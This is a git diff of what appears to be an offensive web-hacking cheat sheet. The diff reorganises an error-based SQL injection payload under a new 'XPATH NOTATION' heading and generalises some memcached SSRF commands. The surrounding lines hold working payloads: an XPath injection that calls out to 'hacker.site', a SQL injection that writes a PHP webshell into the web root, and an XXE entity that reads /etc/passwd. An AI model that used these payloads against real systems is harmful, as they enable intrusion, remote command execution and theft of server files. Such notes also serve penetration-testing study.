@@ -474,8 +474,6 @@ error()
   
 * and doc('http://hacker.site/', name(/*) ))
   
-%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -
-  
 ### Tools
   
 https://xcat.readthedocs.io/en/latest/
@@ -553,6 +551,10 @@ https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_B
 ### Webshell via SQLI
   
 ' union select 1, 2, 3,"<\?php system($_GET['cmd']);\?>" into outfile "/var/www/html/pdp.php"-- -
+ 
+### XPATH NOTATION
+  
+%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -
   
 ## NOSQL Injection
   
@@ -632,9 +634,9 @@ codes/ssrf_protocol_smuggling/memcached.py
   
 -> stats items
   
--> stats cachedump slab_class 10
+-> stats cachedump <slab class> <number of items to dump>
   
--> get item item
+-> get <item>
   
 ### Doc for SSRF - bhack
 
@@ -656,7 +658,7 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 
 -> Part 2
   
-vulns/xxe_oob/evil.dtd
+codes/xxe_oob/evil.dtd
   
 <!ENTITY % file SYSTEM "php>://filter/convert.base64-encode/resource=/etc/passwd">
   
